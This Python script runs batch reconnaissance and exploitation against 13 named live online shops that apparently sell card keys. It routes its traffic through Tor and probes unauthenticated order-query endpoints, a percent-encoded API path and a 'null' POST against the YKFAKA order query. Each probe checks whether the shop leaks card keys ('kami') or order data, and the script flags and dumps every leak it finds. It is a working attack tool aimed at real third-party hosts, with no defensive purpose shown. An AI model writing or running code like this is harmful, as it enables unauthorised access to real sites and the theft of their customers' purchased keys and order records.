#!/usr/bin/env python3
"""Batch SUCCESS_CASES first-pass for 13 shops."""
import json
import re
import socket
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests

OUT = Path("/data/recon/batch13")
(OUT / "probe").mkdir(parents=True, exist_ok=True)
(OUT / "dump").mkdir(parents=True, exist_ok=True)

TARGETS = [
    "https://kaka1880.xyz/shop/",
    "https://db866.lol/shop/",
    "https://xy0088.top/shop/",
    "https://wxr699.top/shop/",
    "https://qqhaoma.top/shop/",
    "http://hm0880.top/shop/",
    "http://suqi777.top/shop/",
    "https://qqx2.cn/",
    "https://pinzun668.top/shop",
    "https://zzqq.lol/shop/",
    "http://xsh168.top/shop/",
    "https://fendou.lol/shop",
    "https://hmjf.lol/shop/",
]

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
PROXIES = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}


def log(*a):
    print(*a, flush=True)


def normalize_base(url: str) -> str:
    u = url.rstrip("/")
    # ensure shop path consistency for joins
    return u


def host_of(url: str) -> str:
    return urllib.parse.urljoin(url, "/").split("/")[2]


def dns_ips(host: str):
    try:
        return sorted(set(x[4][0] for x in socket.getaddrinfo(host, None)))
    except Exception as e:
        return [f"err:{e}"]


def session(tor=True):
    s = requests.Session()
    if tor:
        s.proxies.update(PROXIES)
    s.verify = False
    requests.packages.urllib3.disable_warnings()
    s.headers.update({"User-Agent": UA, "Accept-Language": "zh-CN,zh;q=0.9"})
    return s


def get(s, url, timeout=25, **kw):
    try:
        r = s.get(url, timeout=timeout, allow_redirects=True, **kw)
        return r.status_code, r.text, r.url, dict(r.headers)
    except Exception as e:
        return None, str(e), url, {}


def post(s, url, data=None, timeout=25, **kw):
    try:
        r = s.post(url, data=data, timeout=timeout, allow_redirects=True, **kw)
        return r.status_code, r.text, r.url
    except Exception as e:
        return None, str(e), url


def classify_home(text: str) -> dict:
    t = text or ""
    return {
        "ykfaka": any(x in t for x in ["Query.html", "YKFAKA", "ykfaka", "Query_Km"]),
        "rainbow": any(x in t for x in ["mod=buy", "mod=query", "ajax.php", "hashsalt", "assets/js/csrf.js"]),
        "asp": any(x in t for x in ["buy.asp", "chkuser.asp", "login.asp"]),
        "sec_defend": "sec_defend" in t and "mod=buy" not in t,
        "title": (re.search(r"<title>([^<]+)", t) or [None, None])[1],
        "tg": sorted(set(re.findall(r"t\.me/[\w]+|@[A-Za-z][\w]{3,}", t)))[:15],
    }


def probe_one(url: str) -> dict:
    base = normalize_base(url)
    host = host_of(url if "://" in url else "https://" + url)
    origin = f"https://{host}" if not url.startswith("http://") else f"http://{host}"
    # prefer https origin for mixed
    if url.startswith("https://"):
        origin = f"https://{host}"
    elif url.startswith("http://"):
        origin = f"http://{host}"

    row = {
        "target": url,
        "base": base,
        "host": host,
        "ips": dns_ips(host),
        "cases": {},
        "interesting": [],
        "kami_hint": False,
    }
    s = session(True)
    s.headers.update({"Referer": base + "/", "Origin": origin})

    # home
    code, text, final, hdrs = get(s, base + "/", timeout=40)
    # some shops given without trailing slash already in base
    if code in (404, None) or (text and len(text) < 200 and "shop" in base):
        # try with/without slash variants
        alt = base + "/" if not url.endswith("/") else base
        code2, text2, final2, _ = get(s, alt, timeout=40)
        if code2 == 200 and text2 and len(text2) > len(text or ""):
            code, text, final = code2, text2, final2

    cls = classify_home(text or "")
    row["home"] = {
        "code": code,
        "final": final,
        "len": len(text or ""),
        "server": hdrs.get("Server") or hdrs.get("server"),
        **cls,
    }
    safe = re.sub(r"[^a-zA-Z0-9._-]+", "_", url)
    if text and len(text) > 500:
        (OUT / "probe" / f"home_{safe}.html").write_text(text, encoding="utf-8")

    # SUCCESS_CASES — rainbow-style under shop base
    # getcount
    c, t, _, _ = get(
        s,
        base + "/ajax.php?act=getcount",
        headers={"X-Requested-With": "XMLHttpRequest"},
        timeout=25,
    )
    row["cases"]["getcount"] = {"code": c, "body": (t or "")[:300]}
    try:
        row["cases"]["getcount"]["json"] = json.loads(t)
    except Exception:
        pass

    # ajax query
    c, t, _, _ = get(
        s,
        base + "/ajax.php?act=query&page=1",
        headers={"X-Requested-With": "XMLHttpRequest"},
        timeout=25,
    )
    row["cases"]["ajax_query"] = {"code": c, "body": (t or "")[:400]}
    if t and '"data":[{' in t:
        row["interesting"].append("ajax_query_has_data")
        row["kami_hint"] = True

    # qd93
    c, t, _, _ = get(s, base + "/?mod=query&data=1", timeout=35)
    hits = []
    for pat in [r"卡密[^<]{0,80}", r"showOrder", r"mod=faka", r"没有查询到", r"查询结果"]:
        m = re.search(pat, t or "", re.I)
        if m:
            hits.append(m.group(0)[:80])
    row["cases"]["qd93"] = {"code": c, "len": len(t or ""), "hits": hits}
    if any("卡密" in h and "没有" not in (t or "") for h in hits) or "showOrder" in (t or "") or "mod=faka" in (t or ""):
        # stronger check
        if "showOrder" in (t or "") or "mod=faka" in (t or "") or re.search(r"卡密[：:\s].{6,}", t or ""):
            row["interesting"].append("qd93_possible")
            row["kami_hint"] = True

    # %61pi search / tools
    for label, qs in [
        ("api_search", "act=search&id=1"),
        ("api_tools_empty", "act=tools&key="),
        ("api_tools_bad", "act=tools&key=123456&limit=1"),
        ("api_goodslist", "act=goodslist"),
    ]:
        c, t, _, _ = get(s, base + f"/%61pi.php?{qs}", timeout=22)
        row["cases"][label] = {"code": c, "body": (t or "")[:300]}
        if t and any(k in t for k in ["卡密", "out_trade_no", '"km"', "status\":1"]) and "错误" not in t and "登录" not in t:
            if "goodslist" not in label:
                row["interesting"].append(label + "_interesting")
        time.sleep(0.2)

    # YKFAKA surfaces (also try site root and shop)
    yk_paths = [
        "/Query.html",
        "/index.php?m=Home&c=Order&a=query",
    ]
    # for rainbow /shop/, also try site root
    roots = [base]
    if base.endswith("/shop"):
        roots.append(re.sub(r"/shop$", "", base))
    for root in roots:
        for path in yk_paths:
            c, t, _, _ = get(s, root + path, timeout=18)
            key = f"yk_{path.split('?')[0].strip('/')}_{'shop' if root.endswith('shop') else 'root'}"
            snip = (t or "")[:180]
            row["cases"][key] = {"code": c, "len": len(t or ""), "snip": snip}
            if c == 200 and t and ("Query_Km" in t or "ddid" in t.lower() or "卡密" in t):
                row["interesting"].append("ykfaka_surface")
        # null POST classic
        c, t, _ = post(
            s,
            root + "/index.php?m=Home&c=Order&a=query",
            data={"value": "null"},
            timeout=25,
        )
        row["cases"][f"yk_null_{'shop' if root.endswith('shop') else 'root'}"] = {
            "code": c,
            "len": len(t or ""),
            "km_links": len(re.findall(r"Query_Km", t or "")),
            "snip": (t or "")[:160],
        }
        if re.findall(r"Query_Km", t or ""):
            row["interesting"].append("ykfaka_null_live")
            row["kami_hint"] = True

    # triage flags
    gc = row["cases"].get("getcount", {}).get("json") or {}
    if isinstance(gc, dict) and gc.get("code") == 0:
        row["orders"] = gc.get("orders")
        row["yxts"] = gc.get("yxts")
    aq = row["cases"].get("ajax_query", {})
    if aq.get("code") == 500:
        row["ajax_hardened"] = True
    elif aq.get("code") == 200 and '"data":[]' in (aq.get("body") or ""):
        row["ajax_empty"] = True
    search = row["cases"].get("api_search", {}).get("body") or ""
    if "请提供用户登录信息或API对接密钥" in search:
        row["api_search_auth"] = True
    elif "订单不存在" in search:
        row["api_search_open_empty"] = True
    tools_e = row["cases"].get("api_tools_empty", {}).get("body") or ""
    tools_b = row["cases"].get("api_tools_bad", {}).get("body") or ""
    if "确保各项不能为空" in tools_e and "错误" in tools_b:
        row["tools_oracle"] = True

    log(
        "DONE",
        url,
        "title=",
        (row["home"].get("title") or "")[:40],
        "yxts=",
        row.get("yxts"),
        "orders=",
        row.get("orders"),
        "interesting=",
        row["interesting"],
        "ajax=",
        aq.get("code"),
        "search=",
        (search[:40] if search else None),
    )
    return row


def main():
    results = []
    # sequential via Tor is more stable for CDN; light parallelism=2
    with ThreadPoolExecutor(max_workers=2) as ex:
        futs = {ex.submit(probe_one, u): u for u in TARGETS}
        for fut in as_completed(futs):
            try:
                results.append(fut.result())
            except Exception as e:
                u = futs[fut]
                log("FAIL", u, e)
                results.append({"target": u, "error": str(e)})

    # stable order
    order = {u: i for i, u in enumerate(TARGETS)}
    results.sort(key=lambda r: order.get(r.get("target"), 999))

    summary = []
    for r in results:
        summary.append(
            {
                "target": r.get("target"),
                "title": (r.get("home") or {}).get("title"),
                "ips": r.get("ips"),
                "yxts": r.get("yxts"),
                "orders": r.get("orders"),
                "stack": (
                    "ykfaka"
                    if (r.get("home") or {}).get("ykfaka")
                    else "rainbow"
                    if (r.get("home") or {}).get("rainbow")
                    else "asp"
                    if (r.get("home") or {}).get("asp")
                    else "unknown"
                ),
                "ajax_query_code": (r.get("cases") or {}).get("ajax_query", {}).get("code"),
                "api_search": ((r.get("cases") or {}).get("api_search", {}).get("body") or "")[:80],
                "tools_oracle": r.get("tools_oracle"),
                "interesting": r.get("interesting"),
                "kami_hint": r.get("kami_hint"),
            }
        )

    (OUT / "dump" / "BATCH.json").write_text(
        json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    (OUT / "dump" / "SUMMARY.json").write_text(
        json.dumps(summary, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    log("==== SUMMARY ====")
    for srow in summary:
        log(
            srow["target"],
            "|",
            srow.get("stack"),
            "| yxts=",
            srow.get("yxts"),
            "orders=",
            srow.get("orders"),
            "| ajax=",
            srow.get("ajax_query_code"),
            "| interest=",
            srow.get("interesting"),
            "| kami_hint=",
            srow.get("kami_hint"),
        )
    log("WROTE BATCH.json")


if __name__ == "__main__":
    main()
